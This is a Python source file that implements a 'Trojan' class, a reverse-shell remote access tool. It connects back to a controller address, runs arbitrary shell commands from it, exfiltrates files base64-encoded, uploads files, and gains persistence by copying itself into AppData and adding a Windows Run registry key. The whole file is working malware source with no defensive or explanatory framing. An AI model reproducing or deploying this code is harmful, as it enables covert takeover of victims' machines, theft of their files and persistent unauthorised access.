import base64
import socket
import subprocess
import simplejson as json
import os
import shutil
import sys


class Trojan:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.link = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # SOCK_STREAM is TCP
        self.link.connect((ip, port))

    def command_process(self, command):
        try:
            if command[0] == "exit":
                self.link.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                os.chdir(command[1])
                return command[1]
            elif command[0] == "download":
                with open(command[1], "rb") as file:
                    return base64.b64encode(file.read())
            elif command[0] == "upload":
                with open(command[1], "wb") as file:
                    file.write(base64.b64decode(command[2]))
                    return command[1] + " is uploaded"
            elif command[0] == "settle":
                file_path = os.environ["appdata"] + "\\" + command[2]
                if not os.path.exists(file_path):
                    shutil.copyfile(sys.executable, file_path)
                    record = "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {} /t REG_SZ /d ".format(command[1]) + file_path
                    subprocess.call(record, shell=True)
                return "Success"
            else:
                return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        except Exception as e:
            return "Incorrect command"

    def packaging(self, data):
        packet = json.dumps(data)
        self.link.send(packet.encode("utf-8"))

    def packet_decode(self):
        incoming_data = ""
        while True:
            try:
                incoming_data = incoming_data + self.link.recv(1024).decode("utf-8")
                return json.loads(incoming_data)
            except ValueError:
                continue

    def start(self):
        while True:
            command = self.packet_decode()
            data = self.command_process(command)
            self.packaging(data)

        self.link.close()


trojan = Trojan(ip="127.0.0.1", port=8080)
trojan.start()
